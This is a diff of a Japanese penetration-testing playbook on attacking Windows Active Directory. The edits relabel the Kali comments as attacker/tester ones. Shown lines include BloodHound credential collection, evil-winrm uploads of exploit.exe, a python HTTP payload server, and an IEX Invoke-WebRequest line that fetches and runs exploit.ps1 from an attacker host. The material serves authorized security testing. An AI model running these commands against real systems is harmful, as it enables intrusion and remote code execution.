@@ -91,7 +91,7 @@ net user [USERNAME] /domain   # ドメイン上のユーザー情報・最終ロ
 > **`Windows_AD_Attack_Flow.md` Step 3.5 の段階で既に Linux 側で実行済みであれば、ここでは結果の確認だけでよい。** BloodHound は Windows シェル内ではなく **Linux（攻撃側）から1回実行するだけ** が正解。Windows シェル経由で何かを打ち直す必要はない。
 
 ```bash
-# [Kali] 未実行の場合のみ。攻撃側マシン（Linux）から実行
+# [Attacker] 未実行の場合のみ。テスター端末から実行
 bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] -c All
 # [DC_IP] は単一ホスト案件では [IP] と同じ。AD が複数DCで分散している場合のみ DC のIP を別途指定する
 ```
@@ -216,26 +216,26 @@ CVE の悪用に PoC（概念実証コード）が必要な場合の手順。Lin
 evil-winrm には組み込みのファイル転送機能がある。
 
 ```bash
-# [Kali] evil-winrm 接続時に転送用ディレクトリを指定する
+# [Attacker] evil-winrm 接続時に転送用ディレクトリを指定する
 evil-winrm -i [IP] -u [USER] -p '[PASSWORD]' \
   -s /path/to/scripts/   # PowerShellスクリプトを読み込むディレクトリ
 ```
 
 ```powershell
 # [evil-winrm シェル内] ローカルファイルをターゲットにアップロード
-upload /path/on/kali/exploit.exe C:\Windows\Temp\exploit.exe
+upload /path/on/attacker/exploit.exe C:\Windows\Temp\exploit.exe
 
-# ダウンロード（ターゲットからKaliへ）
-download C:\Users\admin\file.txt /path/on/kali/file.txt
+# ダウンロード（ターゲットからテスター端末へ）
+download C:\Users\admin\file.txt /path/on/attacker/file.txt
 ```
 
-### PowerShell でのダウンロード（Kali 側で HTTP サーバーを起動）
+### PowerShell でのダウンロード（テスター端末で HTTP サーバーを起動）
 
 ```bash
-# [Kali] HTTP サーバーを起動してファイルを配信
+# [Attacker] HTTP サーバーを起動してファイルを配信
 cd /path/to/exploit/
 python3 -m http.server 8888
-# VPN環境では tun0 の IP を使う: ip addr show tun0
+# テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う: ip a
 ```
 
 ```powershell
@@ -261,7 +261,7 @@ IEX (Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.ps1" -UseBasicPar
 ### CVE の調べ方（PoC を探す前に）
 
 ```bash
-# [Kali] バージョン情報からCVEを検索
+# [Attacker] バージョン情報からCVEを検索
 searchsploit windows server [年]
 searchsploit [技術名] [バージョン]
 
